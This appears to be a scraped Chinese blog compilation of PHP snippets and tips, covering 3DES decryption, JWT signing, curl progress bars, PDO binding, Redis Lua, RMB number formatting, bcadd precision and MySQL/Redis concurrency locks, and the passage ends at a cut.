openssl_encrypt($input,'des-ede3',$key,0);openssl_encrypt加密会按照加密模式进行加密，之后还会进行base64加密，所以需要进行解密base64_decode($data);所以解密方法如下：# 解密https://phpartisan.cn/news/122.html$decrypted = openssl_decrypt(base64_decode($data),'des-ede3',$key,OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); API 系列 - 深入浅出 JSON Web Token jwt12345678910111213141516171819202122232425262728293031323334353637383940414243JWT 的认证过程如下：客户端发送登录信息（用户 ID，密码）服务端基于密钥生成 JWT，返回给客户端客户端在接下来的请求中将 Token 放在头部中一起发送给服务端服务端对 JWT 进行验证JWT 可分为三部分，用 . 符号隔开Header 头部Payload 负载Signature 签名function base64url(string $string)&#123; return str_replace('=', '', strtr(base64_encode($string), '+/', '-_'));&#125;$header = [ 'alg' =&gt; 'HS256', 'typ' =&gt; 'JWT',];$payload = [ 'sub' =&gt; 1, 'name' =&gt; 'Mind Geek', 'admin' =&gt; true,];$secret = 'mind-geek-jwt';// Header$base64Header = base64url(json_encode($header));// Payload$base64Payload = base64url(json_encode($payload));$encryp = $base64Header.".".$base64Payload;$signature = hash_hmac('sha256', $encryp, $secret, true);$base64Signature = base64url($signature);$token = $base64Header.".".$base64Payload.".".$base64Signature;$token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsIm5hbWUiOiJNaW5kIEdlZWsiLCJhZG1pbiI6dHJ1ZX0.0_dneYOin4yWRYlD-KmfvGEY6AhjA_zDyyvPhgYq2sU';list($base64Header, $base64Payload, $base64Signature) = explode('.', $token);$encryp = $base64Header.".".$base64Payload;$signature = hash_hmac('sha256', $encryp, $secret, true);$computedBase64Signature = base64url($signature);if($computedBase64Signature === $base64Signature)&#123; echo "认证成功!";&#125;https://learnku.com/articles/37426 UTC 格式的时间转换123456789101112&lt;?phpuse Carbon\Carbon;$input = 2018-01-01T12:00:00.000+0100;// 实例化一个 Carbon 对象$carbon = Carbon::make($input);// 转换时区$carbon-&gt;setTimezone('PRC');// 输出查看echo $carbon-&gt;toDateTimeString(); Curl 下载文件实时进度条显示1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374class Request&#123; protected $bar; // 是否下载完成 protected $downloaded = false; public function __construct() &#123; // 初始化一个进度条https://github.com/dariuszp/cli-progress-bar $this-&gt;bar = new CliProgressBar(100); $this-&gt;bar-&gt;display(); $this-&gt;bar-&gt;setColorToRed(); &#125; function download($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 开启进度条 curl_setopt($ch, CURLOPT_NOPROGRESS, 0); // 进度条的触发函数 curl_setopt($ch, CURLOPT_PROGRESSFUNCTION, [$this,'progress']); // ps: 如果目标网页跳转，也跟着跳转 // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); if (false === ($stream = curl_exec($ch))) &#123; throw new \Exception(curl_errno($ch)); &#125; curl_close($ch); return $stream; &#125; /** * 进度条下载. * * @param $ch * @param $countDownloadSize 总下载量 * @param $currentDownloadSize 当前下载量 * @param $countUploadSize * @param $currentUploadSize */ public function progress($ch, $countDownloadSize, $currentDownloadSize, $countUploadSize, $currentUploadSize) &#123; // 等于 0 的时候，应该是预读资源不等于0的时候即开始下载 // 这里的每一个判断都是坑，多试试就知道了 if (0 === $countDownloadSize) &#123; return false; &#125; // 有时候会下载两次，第一次很小，应该是重定向下载 if ($countDownloadSize &gt; $currentDownloadSize) &#123; $this-&gt;downloaded = false; // 继续显示进度条 &#125; // 已经下载完成还会再发三次请求 elseif ($this-&gt;downloaded) &#123; return false; &#125; // 两边相等下载完成并不一定结束， elseif ($currentDownloadSize === $countDownloadSize) &#123; return false; &#125; // 开始计算 $bar = $currentDownloadSize / $countDownloadSize * 100; $this-&gt;bar-&gt;progress($bar); &#125;&#125;(new Request)-&gt;download('http://www.shiguopeng.cn/database.sql');http://www.shiguopeng.cn/archives/249 bindParam的绑定参数是引用1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php /** * $dbh是pdo实例化后的对象的句柄。 * 第二个参数格式必须与第一个参数对应 * $db-&gt;paramBindExec("select user_name, notes from message where user_name=:user_name", array(':user_name'=&gt;'guest'), false); * * @param string $sql 预执行的SQL语句 * @param array $param SQL参数绑定 */ private function paramBindExec($sql, $param) &#123; try &#123; $this-&gt;statement = $this-&gt;dbh-&gt;prepare($sql); // 绑定参数 if (!empty($param)) &#123; foreach ($param as $key =&gt; $value) &#123; // 错误的写法 // $this-&gt;statement-&gt;bindParam($key, $value); // 正确的写法 $this-&gt;statement-&gt;bindParam($key, $param[$key]); &#125; &#125; // 遗留下来的$value将会被引用最后一次的值 return $this-&gt;statement-&gt;execute(); &#125; catch (PDOException $e) &#123; $this-&gt;error_num = $e-&gt;getCode(); $this-&gt;error_message = $e-&gt;getMessage(); return false; &#125; &#125;绑定一个PHP变量到用作预处理的SQL语句中的对应命名占位符或问号占位符。 不同于PDOStatement::bindValue()，此 变量作为引用被绑定，并只在PDOStatement::execute()被调用的时候才取其值看到引用二字方醒悟，并不是循环一次，绑定一次参数。而是循环所有次数，才将参数绑定上去。而我绑定的变量每一次都是$value。最后将$value改成$param[$key]即可 http://www.shiguopeng.cn/archives/28 寻找数组中重复的值12345678function FetchRepeatMemberInArray($array) &#123; // 获取去掉重复数据的数组 $unique_arr = array_unique ( $array ); // 获取重复数据的数组 $repeat_arr = array_diff_assoc ( $array, $unique_arr ); $repeat_arr = array_unique ( $repeat_arr ); return $repeat_arr;&#125; php+redis+lua1234567891011121314eval "return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;" 2 key1 key2 first second$lua = "return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;";$s = $redis-&gt;eval($lua,array('key1','key2','first','second'),2);$lua = "local ret=&#123;&#125;; for i,v in pairs(KEYS) do ret[i]=redis.call('hgetall', v) end; return ret";$obj = new Dao_RedisBase();$arr_hash_key = ['hash1','hash2','hash3','hash4'];$hashresult=$obj-&gt;getCon()-&gt;eval($lua,$arr_hash_key,count($arr_hash_key));if redis.call("get",KEYS[1]) == ARGV[1] then return redis.call("del",KEYS[1])else return 0endhttps://bettercuicui.github.io/2017/07/04/REDIS/php+redis+lua/ ob缓存1234567891011121314151617181920212223ob_start();echo "aaa";header('Content-Type:text/html;charset=utf-8');echo "bbb";$i =1;while($i&lt;5)&#123; echo $i++; sleep(1);&#125;$i =1;while($i&lt;5)&#123; echo $i++; flush(); sleep(1);&#125;flush()这个函数会把程序缓存的内容输出到浏览器中，并且清空程序缓存区的内容。这样就可以做到1-5依次输出到屏幕，每次sleep1秒啦。ob_start(); //打开缓冲区php页面的全部输出$content = ob_get_contents(); //取得php页面输出的全部内容$fp = fopen("output00001.html", "w"); //创建一个文件，并打开，准备写入fwrite($fp, $content); //把php页面的内容全部写入output00001.html，然后……fclose($fp);https://bettercuicui.github.io/2016/11/29/PHP/%E7%BC%93%E5%AD%98%E6%80%BB%E7%BB%93/ 不要直接克隆对象，请使用深拷贝12345678910111213141516171819202122232425262728293031323334 final class Car &#123; public $model; // 为了减少代码量，将其声明为公共方法 public function __construct(CarModel $model) &#123; $this-&gt;model = $model; &#125; &#125;final class CarModel &#123; public $name; public $year; public function __construct($name, $year) &#123; $this-&gt;name = $name; $this-&gt;year = $year; &#125; &#125; $bmwX1 = new Car(new CarModel('X1', 2015)); $bmwX5 = clone $bmwX1; var_dump(spl_object_hash($bmwX1)); // "0000000037e353af0000558c268309ea" var_dump(spl_object_hash($bmwX5)); // "0000000037e353ac0000558c268309ea" $bmwX5-&gt;model-&gt;name = 'X5'; var_dump($bmwX1-&gt;model); var_dump($bmwX5-&gt;model); // object(CarModel)#2 (2) &#123; // ["name"]=&gt; "X5" // ["year"]=&gt; int(2015) // &#125; https://github.com/myclabs/DeepCopy use function DeepCopy\deep_copy; $bmwX1 = new Car(new CarModel('X1', 2015)); $bmwX5 = deep_copy($bmwX1);https://learnku.com/php/t/37604 php请求接口异步化1234567891011121、用户每次请求删除的接口，直接把参数、操作保存在redis的list结构中。2、crontable添加一个cron脚本，每分钟执行一次。3、cron脚本读取redis的list，有值则fork出子进程进行操作。记得要set_time_limit();4、如果cron脚本读取出list中的值，可以先标记一下，表示有脚本正在执行这个操作，如果执行失败还可以把这个任务塞回去再次执行。5、当cron脚本再次发现list有值，先判断有没有脚本正在执行这个操作，有则不管了。如果php的执行方式是fastcgi，则有fastcgi_finish_request这个api。此函数冲刷(flush)所有响应的数据给客户端并结束请求。这使得客户端结束连接后，需要大量时间运行的任务能够继续运行。echo "正在进行删除操作，请稍后";fastcgi_finish_request();for($i = 1-10000)&#123; 删除uid = $i的数据；&#125;用户通过浏览器请求删除的操作，立马收到’正在进行删除操作，请稍后’的提示，但是数据并没有被删除完，等50s后，才发现数据被删除完毕。由此说明在调用fastcgi_finish_request后,客户端响应就已经结束,但与此同时服务端脚本却继续运行！https://bettercuicui.github.io/2018/04/01/PHP/php%E8%AF%B7%E6%B1%82%E6%8E%A5%E5%8F%A3%E5%BC%82%E6%AD%A5%E5%8C%96%20/ 人民币小写转大写12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/** * 人民币小写转大写 * * @param string $number 数值 * @param string $intUnit 币种单位，默认"元" * @param bool $isRound 是否对小数进行四舍五入 * @param bool $isExtraZero 是否对整数部分以0结尾，小数存在的数字附加0,比如1960.30， * 有的需要输出"壹仟玖佰陆拾元零叁角"，实际上"壹仟玖佰陆拾元叁角"也是对的，随意，默认第一种 * @return string */public static function formatMoney($number, $intUnit = '元', $isRound = true, $isExtraZero = true)&#123; $money = $number / 100; $parts = explode('.', $money, 2); $int = isset($parts[0]) ? strval($parts[0]) : '0'; $dec = isset($parts[1]) ? strval($parts[1]) : ''; // 如果小数点后多于2位，不四舍五入就直接截，否则就处理 $decLen = strlen($dec); if (isset($parts[1]) &amp;&amp; $decLen &gt; 2) &#123; $dec = $isRound ? substr(strrchr(strval(round(floatval("0.".$dec), 2)), '.'), 1) : substr($parts[1], 0, 2); &#125; // 当number为0.001时，小数点后的金额为0元 if (empty($int) &amp;&amp; empty($dec)) &#123; return '零'; &#125; // 定义 $chs = ['0','壹','贰','叁','肆','伍','陆','柒','捌','玖']; $uni = ['','拾','佰','仟']; $decUnit = ['角', '分']; $exp = ['', '万']; $res = ''; // 整数部分从右向左找 for ($i = strlen($int) - 1, $k = 0; $i &gt;= 0; $k++) &#123; $str = ''; // 按照中文读写习惯，每4个字为一段进行转化，i一直在减 for ($j = 0; $j &lt; 4 &amp;&amp; $i &gt;= 0; $j++, $i--) &#123; $u = $int&#123;$i&#125; &gt; 0 ? $uni[$j] : ''; $str = $chs[$int&#123;$i&#125;] . $u . $str; &#125; $str = rtrim($str, '0'); $str = preg_replace("/0+/", "零", $str); if (!isset($exp[$k])) &#123; $exp[$k] = $exp[$k - 2] . '亿'; &#125; $u2 = $str != '' ? $exp[$k] : ''; $res = $str . $u2 . $res; &#125; // 如果小数部分处理完之后是00，需要处理下 $dec = rtrim($dec, '0'); // 小数部分从左向右找 if (!empty($dec)) &#123; $res .= $intUnit; // 是否要在整数部分以0结尾的数字后附加0，有的系统有这要求 if ($isExtraZero) &#123; if (substr($int, -1) === '0') &#123; $res.= '零'; &#125; &#125; for ($i = 0, $cnt = strlen($dec); $i &lt; $cnt; $i++) &#123; $u = $dec&#123;$i&#125; &gt; 0 ? $decUnit[$i] : ''; $res .= $chs[$dec&#123;$i&#125;] . $u; &#125; $res = rtrim($res, '0'); $res = preg_replace("/0+/", "零", $res); &#125; else &#123; $res .= $intUnit . '整'; &#125; return $res;&#125;https://blog.11010.net/archives/9/ 不用内置函数取代var_dump()12345678910111213141516function dump($var, $label = '', $return = false)&#123; if(ini_get('html_errors'))&#123; $content = "&lt;pre&gt;\n"; if($label != '')&#123; $content .= "&lt;strong&gt;&#123;$label&#125;&lt;/strong&gt;\n"; &#125; $content .= htmlspecialchars(print_r($var, true)); $content .= "\n&lt;/pre&gt;\n"; &#125;else&#123; $content .= $label . ":\n" . print_r($var,true); &#125; if($return) return $content; echo $content; return null;&#125; json转换12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788https://3v4l.org/JSStn&lt;?php$json_str='&#123; "code": 200, "message": "操作成功", "data": [ &#123; "id": 1, "goods_id": 1, "property_name_id": 1, "property_value_id": 1, "property_name": &#123; "title": "份量", "is_sale": true &#125;, "property_value": &#123; "id": 1, "value": "小份", "image": "" &#125; &#125;, &#123; "id": 2, "goods_id": 1, "property_name_id": 1, "property_value_id": 2, "property_name": &#123; "title": "份量", "is_sale": true &#125;, "property_value": &#123; "id": 2, "value": "中份", "image": "" &#125; &#125;, &#123; "id": 3, "goods_id": 1, "property_name_id": 2, "property_value_id": 4, "property_name": &#123; "title": "温度", "is_sale": true &#125;, "property_value": &#123; "id": 4, "value": "常温", "image": "" &#125; &#125;, &#123; "id": 4, "goods_id": 1, "property_name_id": 2, "property_value_id": 5, "property_name": &#123; "title": "温度", "is_sale": true &#125;, "property_value": &#123; "id": 5, "value": "加冰", "image": "" &#125; &#125; ]&#125;'; $obj = json_decode($json_str); $data = []; foreach($obj-&gt;data as $v)&#123; $nid=$v-&gt;property_name_id; if(!array_key_exists($nid,$data))&#123; $o = new stdclass;//new Class&#123;&#125; $o-&gt;property_id = $v-&gt;property_name_id; $o-&gt;property_name = $v-&gt;property_name-&gt;title; $o-&gt;is_sale= $v-&gt;property_name-&gt;is_sale ; $data[$nid]=$o; &#125; $data[$nid]-&gt;items[]=$v-&gt;property_value; &#125; $obj-&gt;data = array_values($data); print_r($obj); //echo json_encode($obj); https://learnku.com/articles/37803#reply121107 无限级菜单排序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667$temp = [ ['id' =&gt; 1, 'pid' =&gt; 0, 'name' =&gt; '商品管理'], ['id' =&gt; 2, 'pid' =&gt; 1, 'name' =&gt; '平台自营'], ['id' =&gt; 3, 'pid' =&gt; 2, 'name' =&gt; '图书品类'], ['id' =&gt; 4, 'pid' =&gt; 2, 'name' =&gt; '3C品类'], ['id' =&gt; 5, 'pid' =&gt; 0, 'name' =&gt; '第三方'], ['id' =&gt; 6, 'pid' =&gt; 5, 'name' =&gt; '家私用品'], ['id' =&gt; 7, 'pid' =&gt; 5, 'name' =&gt; '书法品赏'], ['id' =&gt; 8, 'pid' =&gt; 7, 'name' =&gt; '行书'], ['id' =&gt; 9, 'pid' =&gt; 8, 'name' =&gt; '行楷'], ['id' =&gt; 10, 'pid' =&gt; 9, 'name' =&gt; '张山行楷字帖'], ['id' =&gt; 11, 'pid' =&gt; 22, 'name' =&gt; '李四行楷字帖'], ];function te(array $arr, $node = 0)&#123; $tem = []; foreach ($arr as $val) &#123; $pid = $val['pid']; // 当前菜单的父级ID $id = $val['id']; // 当前菜单ID // 当前的父级ID和node节点匹配，说明当前子菜单属于node节点。 if ($pid == $node) &#123; $tem[$id] = $val; // 保存当前的菜单。 $son = te($arr, $id); // 递归 当前子菜单是否有子菜单？ // 当有的时候，保存 。 if (!empty($son)) &#123; $tem[$id]['son'] = $son; &#125; &#125; &#125; return $tem;&#125;function show(array $arr, $node = 0)&#123; foreach ($arr as $val) &#123; if ($val['pid'] == 0) &#123; $node = 0; &#125; for ($i = 0; $i &lt; $node; $i++) &#123; echo '----'; &#125; echo $val['name'] . "\n"; if (isset($val['son'])) &#123; $node += 1; show($val['son'], $node); &#125; &#125;&#125;$menus = te($temp); show($menus); function traverseMenu(array $menus, array &amp;$result, $pid = 0) &#123; foreach ($menus as $child_menu) &#123; if ($child_menu['pid'] == $pid) &#123; $item = ['id' =&gt; $child_menu['id'], 'name' =&gt; $child_menu['name'], 'children' =&gt; []]; traverseMenu($menus, $item['children'], $child_menu['id']); $result[] = $item; &#125; else &#123; continue; &#125; &#125; &#125; $result = []; traverseMenu($temp, $result, 0); https://learnku.com/laravel/t/37883 静态变量 缓存1234567891011121314151617181920212223class App&#123; public function getData() &#123; static $data = []; if (!$data) &#123; $path = __DIR__.'/data.json'; $data = json_decode(file_get_contents($path), true); &#125; return $data; &#125;&#125;// info1.php$app = new App;$info = $app-&gt;getData();// info2.php$app = new App;$info = $app-&gt;getData();https://learnku.com/lk/t/34710 composer 内存不足12345678910111213free -m total used free shared buff/cache availableMem: 864 372 306 50 185 296Swap: 0 0 0# 如上发现Swap实际都为0/bin/dd if=/dev/zero of=/var/swap.1 bs=1M count=1024/sbin/mkswap /var/swap.1/sbin/swapon /var/swap.1# 再次使用free -m，发现已经有了Swap内存配置 total used free shared buff/cache availableMem: 864 383 67 49 413 267Swap: 1023 0 1023# 再次运行composer install即可 PHP 仿 Word 统计文章字数12345678910111213141516171819function comment_count_word($str)&#123; //$str =characet($str); //判断是否存在替换字符 $is_tihuan_count=substr_count($str,"龘"); try &#123; //先将回车换行符做特殊处理 $str = preg_replace('/(\r\n+|\s+| +)/',"龘",$str); //处理英文字符数字，连续字母、数字、英文符号视为一个单词 $str = preg_replace('/[a-z_A-Z0-9-\.!@#\$%\\\^&amp;\*\)\(\+=\&#123;\&#125;\[\]\/",\'&lt;&gt;~`\?:;|]/',"m",$str); //合并字符m，连续字母、数字、英文符号视为一个单词 $str = preg_replace('/m+/',"*",$str); //去掉回车换行符 $str = preg_replace('/龘+/',"",$str); //返回字数 return mb_strlen($str)+$is_tihuan_count; &#125; catch (Exception $e) &#123; return 0; &#125;&#125;https://learnku.com/articles/37939 Tesseract 图片识别1234567891011121314151617181920212223242526272829composer require thiagoalessio/tesseract_ocrclass ImageService&#123; public function read(string $url) &#123; $path = $this-&gt;save($url); return $this-&gt;tesseract($path); &#125; /** * @Task */ public function tesseract(string $path) &#123; return (new TesseractOCR($path))-&gt;run(); &#125; protected function save(string $url): string &#123; $client = di()-&gt;get(ClientFactory::class)-&gt;create(); $content = $client-&gt;get($url)-&gt;getBody()-&gt;getContents(); $path = BASE_PATH . '/runtime/' . uniqid(); file_put_contents($path, $content); return $path; &#125;&#125;https://learnku.com/articles/32096 imagepng 返回的图片流直接上传12345678910ob_start();imagepng($image_data);$string_data = ob_get_contents(); // read from bufferob_end_clean(); // delete bufferOss::uploadByString($string_data)https://learnku.com/php/t/38225 PHP 方法重写1234567891011121314151617php 方法重写，参数不同，报错： Declaration of should be compatible with thatStrict standards: Declaration of ... should be compatible with that of ...解决方法：&lt;?phpabstract class A &#123;// 方法无参数public static function foo()&#123; echo 'bar'; &#125;&#125;abstract class B extends A &#123;// 方法有参数public static function foo($str = NULL)&#123; echo $str; &#125;&#125;https://learnku.com/articles/38351 最全的县级以上信息包12345678910111213composer require medz/gb-t-2260^2.0$getter = \Medz\GBT2260\Getter::instance();## 获取一个代码的省信息$province = $getter-&gt;province('511304'); // 四川省## 获取市级地区，注意，直辖地区是返回 null$city = $getter-&gt;city('511304'); // 南充市## 获取区级地区$county = $getter-&gt;county('511304'); // 嘉陵区https://github.com/medz/gb-t-2260 this、self、static 的区别12345678910111213141516171819202122232425262728293031323334$this 调用类实例self 类自身static 调用类class A &#123; public static function foo() &#123; echo 'A-foo&lt;br&gt;'; &#125;&#125;class B extends A &#123; public static function test() &#123; A::foo(); // 结果：A-foo static::foo(); // 结果：C-foo self::foo(); // 结果：B-foo &#125; public static function foo() &#123; echo 'B-foo&lt;br&gt;'; &#125;&#125;class C extends B &#123; public static function foo() &#123; echo 'C-foo&lt;br&gt;'; &#125;&#125;https://learnku.com/articles/38406C::test(); 零宽空格1234567891011121314151617// 正常的优惠券b4c44af562// urlencode() 之后b4c44af562// 有问题的优惠券b4c44af562​​​​​​​​​​​​​​// urlencode() 之后b4c44af562%e2%80%8b%e2%80%8b%e2%80%8b%e2%80谷歌了下，这个东西叫做 零宽空格。一般的空格是有宽度的，使用光标可以将它选中。但零宽空格没有宽度，看不见，也难以选中，就像不存在一样。https://zh.wikipedia.org/wiki/%E9%9B%B6%E5%AE%BD%E7%A9%BA%E6%A0%BChttp://sakyavarro.cn/post/%E9%9B%B6%E5%AE%BD%E7%A9%BA%E6%A0%BC控制台 copy(decodeURI('%E2%80%8B')) 数组转utf-8123456789101112131415161718 /** * 数组转utf-8 * @param string $data * @return array */ function gbk_to_utf8($data)&#123; if(is_array($data))&#123; foreach($data as $key =&gt; $value)&#123; $data[$key]=call_user_func(__FUNCTION__,$value); &#125; return $data; &#125; return iconv("gbk","utf-8",$data); &#125;echo date('Y/m/d', strtotime('last day of -1 month'));echo date('Y/m/d', strtotime('-1 month', strtotime('2019/03/31')));today()-&gt;subMonthNoOverflow() 阿拉伯数字和中文数字的相互转换1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586function numToWord($num)&#123; $chiNum = array('零', '一', '二', '三', '四', '五', '六', '七', '八', '九'); $chiUni = array('','十', '百', '千', '万', '十', '百', '千', '亿'); $chiStr = ''; $num_str = (string)$num; $count = strlen($num_str); $last_flag = true; //上一个 是否为0 $zero_flag = true; //是否第一个 $temp_num = null; //临时数字 $chiStr = '';//拼接结果 if ($count == 2) &#123;//两位数 $temp_num = $num_str[0]; $chiStr = $temp_num == 1 ? $chiUni[1] : $chiNum[$temp_num].$chiUni[1]; $temp_num = $num_str[1]; $chiStr .= $temp_num == 0 ? '' : $chiNum[$temp_num]; &#125;else if($count &gt; 2)&#123; $index = 0; for ($i=$count-1; $i &gt;= 0 ; $i--) &#123; $temp_num = $num_str[$i]; if ($temp_num == 0) &#123; if (!$zero_flag &amp;&amp; !$last_flag ) &#123; $chiStr = $chiNum[$temp_num]. $chiStr; $last_flag = true; &#125; if($index == 4 &amp;&amp; $temp_num == 0)&#123; $chiStr = "万".$chiStr; &#125; &#125;else&#123; if($i == 0 &amp;&amp; $temp_num == 1 &amp;&amp; $index == 1 &amp;&amp; $index == 5)&#123; $chiStr = $chiUni[$index%9] .$chiStr; &#125;else&#123; $chiStr = $chiNum[$temp_num].$chiUni[$index%9] .$chiStr; &#125; $zero_flag = false; $last_flag = false; &#125; $index ++; &#125; &#125;else&#123; $chiStr = $chiNum[$num_str[0]]; &#125; return $chiStr;&#125;function cn2num($string)&#123; if(is_numeric($string))&#123; return $string; &#125; // '仟' =&gt; '千','佰' =&gt; '百','拾' =&gt; '十', $string = str_replace('仟', '千', $string); $string = str_replace('佰', '百', $string); $string = str_replace('拾', '十', $string); $num = 0; $wan = explode('万', $string); if (count($wan) &gt; 1) &#123; $num += cn2num($wan[0]) * 10000; $string = $wan[1]; &#125; $qian = explode('千', $string); if (count($qian) &gt; 1) &#123; $num += cn2num($qian[0]) * 1000; $string = $qian[1]; &#125; $bai = explode('百', $string); if (count($bai) &gt; 1) &#123; $num += cn2num($bai[0]) * 100; $string = $bai[1]; &#125; $shi = explode('十', $string); if (count($shi) &gt; 1) &#123; $num += cn2num($shi[0] ? $shi[0] : '一') * 10; $string = $shi[1] ? $shi[1] : '零'; &#125; $ling = explode('零', $string); if (count($ling) &gt; 1) &#123; $string = $ling[1]; &#125; $d = array( '一' =&gt; '1','二' =&gt; '2','三' =&gt; '3','四' =&gt; '4','五' =&gt; '5','六' =&gt; '6','七' =&gt; '7','八' =&gt; '8','九' =&gt; '9', '壹' =&gt; '1','贰' =&gt; '2','叁' =&gt; '3','肆' =&gt; '4','伍' =&gt; '5','陆' =&gt; '6','柒' =&gt; '7','捌' =&gt; '8','玖' =&gt; '9', '零' =&gt; 0, '0' =&gt; 0, 'O' =&gt; 0, 'o' =&gt; 0, '两' =&gt; 2 ); return $num + @$d[$string];&#125;https://learnku.com/articles/39405 excel大数据导出1234567891011121314151617181920212223242526//https://github.com/Maatwebsite/Laravel-Excel//不限制执行时间set_time_limit(0);//最大内存ini_set('memory_limit', '-1');//导出txt逻辑$file_path = $file_name.".txt";$str = "";//拼接表头字符Storage::disk('local')-&gt;put($file_path, $str);//以二进制的方式追加读写$file = fopen(storage_path().$file_path, "a+b");$str = "";$rows = [];//数据源foreach ($rows as $row) &#123; //耗时处理操作得到$str ... //每处理1条数据就写入一次，数据量大时，建议批量写入 fwrite($file, $str."\n");&#125;fclose($file);https://learnku.com/articles/38828#reply125534 bcadd 的精度1234567891011121314151617181920212223242526272829301、数值1) 4位小数，且前4位为0的\Log::info('bcadd:' . bcadd(0.00002200, 0, 8));// 结果：bcadd:0.000000002) 5位小数，且前4位有大于0的\Log::info('bcadd:' . bcadd(0.00012200, 0, 8));// 结果：bcadd:0.000122002、字符串\Log::info('bcadd:' . bcadd('0.00002200', 0, 8));// 等同于 \Log::info('bcadd:' . bcadd((string)0.00012200, 0, 8)); // 结果：bcadd:0.000022003、科学记数法1) 5位小数，且前4位有大于0的\Log::info('bcadd:' . bcadd(2.2E-4, 0, 8));// 结果：bcadd:0.000220002) 5位小数，且第4位等于0\Log::info('bcadd:' . bcadd(2.2E-5, 0, 8));// 结果：bcadd:0.000000003) 5为小数，第4位大于0\Log::info('bcadd:' . bcadd(12.2E-5, 0, 8));// 结果：bcadd:0.00012200结论是超过 4 位小数，且前 4 位都为 0 时，如不转为字符串进行 bcadd 计算，那么精度会有问题，结果会按 0 来计算；高精度计算，建议先转为字符串再进行计算。根据需要，提前转为精度+1的字符串类型参与计算，如需保留6位，就取7位出来$value = 0.000011;$value = sprintf('%.7f', $value);保存数据时，可转再转为6位$model-&gt;value = bcadd($value, 0, 6);$model-&gt;save();https://learnku.com/articles/39459 mysql 并发锁123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293 $process_num = 50; //开50个进程，模拟50个用户 for ($i = 0; $i &lt; $process_num; $i++) &#123; MultiProcessHelper::instance($process_num)-&gt;multiProcessTask(function () use ($i) &#123; if (Db::name('product')-&gt;where('id', 1)-&gt;value('count') &gt; 0) &#123; $res = Db::name('product')-&gt;where('id', 1)-&gt;setDec('count'); if ($res) &#123; dump('获取到更新资源权限：' . $i); &#125; &#125; &#125;); &#125;这就是高并发带来的问题，同一时刻有多个进程读取同一条数据，同一时刻有多个进程更新同一条数据mysql 提供的行级锁 select ... lock in share mode（阻塞写），select ... for update（阻塞读写，悲观锁），所以 for update 机制能满足我们的原子要求。编辑代码如下： $process_num = 50; //开50个进程，模拟50个用户 for ($i = 0; $i &lt; $process_num; $i++) &#123; MultiProcessHelper::instance($process_num)-&gt;multiProcessTask(function () use ($i) &#123; Db::startTrans(); //行级锁必须在事务中才能生效 //设置for update，进程会阻塞在这里，只能允许一个进程获取到行锁，其他等待获取 if (Db::name('product')-&gt;where('id', 1)-&gt;lock('for update')-&gt;value('count') &gt; 0) &#123; $res = Db::name('product')-&gt;where('id', 1)-&gt;setDec('count'); if ($res) &#123; dump('获取到更新资源权限：' . $i); &#125; &#125; Db::commit(); &#125;); &#125; update $process_num = 50; //开50个进程，模拟50个用户 for ($i = 0; $i &lt; $process_num; $i++) &#123; MultiProcessHelper::instance($process_num)-&gt;multiProcessTask(function () use ($i) &#123; //合并两条语句为一条更新语句 $res = Db::name('product')-&gt;where('id', 1)-&gt;where('count', '&gt;', 0)-&gt;setDec('count'); if ($res) &#123; dump('获取到更新资源权限：' . $i); &#125; &#125;); &#125;文件锁 $process_num = 50; //开50个进程，模拟50个用户 for ($i = 0; $i &lt; $process_num; $i++) &#123; MultiProcessHelper::instance($process_num)-&gt;multiProcessTask(function () use ($i) &#123; $filename = app()-&gt;getRootPath() . 'runtime/lock'; $file = fopen($filename, 'w'); //打开文件 $lock = flock($file, LOCK_EX); // $lock=flock($handle, LOCK_EX|LOCK_NB); （异步非阻塞，所有进程如果出现获取不到锁，不等待跳过，加锁失败） //获取文件排他锁:LOCK_EX（异步阻塞，只有一个进程获得锁，其他竞争进程等待） //还有一种共享锁:LOCK_SH（所有进程都可以获取共享锁，读取文件，当且只有一个锁时，才允许写操作，否则操作失败，容易出现死锁问题） if ($lock) &#123; try &#123; if (Db::name('product')-&gt;where('id', 1)-&gt;lock('for update')-&gt;value('count') &gt; 0) &#123; $res = Db::name('product')-&gt;where('id', 1)-&gt;setDec('count'); if ($res) &#123; dump('获取到更新资源权限：' . $i); &#125; &#125; &#125; catch (\Exception $e) &#123; dump($e-&gt;getMessage()); &#125; finally &#123; flock($file, LOCK_UN); //无论如何都要释放锁 &#125; &#125; fclose($file); //关闭文件句柄 &#125;); &#125; 在集群架构、分布式等多机联网结构中就是掩耳盗铃了，所以适应性更好地锁机制还是要使用分布式锁，分布式锁最常用和最易用就是 redis 的 setnx 锁了。 编辑代码如下： $process_num = 50; //开50个进程，模拟50个用户 for ($i = 0; $i &lt; $process_num; $i++) &#123; MultiProcessHelper::instance($process_num)-&gt;multiProcessTask(function () use ($i) &#123; //获取redis锁 //关于CacheHelper::getRedisLock是怎样获取锁的，注意几个点就行：1.如何避免死锁；2.如何设置过期时间；3.如何设置抢占条件；4.如何循环等待判断。这些不在本文讨论范围，可自行研究，以后有空我也可以写一篇博文 $lock = CacheHelper::getRedisLock('redis_lock'); if ($lock) &#123; try &#123; if (Db::name('product')-&gt;where('id', 1)-&gt;lock('for update')-&gt;value('count') &gt; 0) &#123; $res = Db::name('product')-&gt;where('id', 1)-&gt;setDec('count'); if ($res) &#123; dump('获取到更新资源权限：' . $i); &#125; &#125; &#125; catch (\Exception $e) &#123; dump($e-&gt;getMessage()); &#125; &#125; else &#123; // dump('获取redis锁失败'); &#125; &#125;); &#125; from https://learnku.com/articles/39244 并发下安全读写文件函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?php /** * @link http://kodcloud.com/ * @author warlee | 